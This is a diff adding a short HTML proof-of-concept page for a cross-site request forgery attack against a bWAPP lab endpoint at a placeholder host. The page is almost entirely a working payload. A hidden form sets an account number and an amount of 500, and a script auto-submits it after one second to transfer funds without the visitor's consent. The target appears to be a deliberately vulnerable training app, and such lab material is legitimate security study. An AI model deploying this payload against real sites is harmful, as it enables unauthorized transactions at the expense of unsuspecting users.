@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CSRF Attack PoC</h1>
+    <p>This form will attempt to transfer funds without user consent.</p>
+
+    <form action="http://target-website.com/bWAPP/csrf_2.php" method="GET">
+        
+        <input type="hidden" name="account" value="143-45552-96">
+        <input type="hidden" name="amount" value="500">
+        <button type="submit">Transfer Funds</button>
+    </form>
+
+    <script>
+        
+        setTimeout(function() {
+            document.forms[0].submit();
+        }, 1000); 
+    </script>
+</body>
+</html>
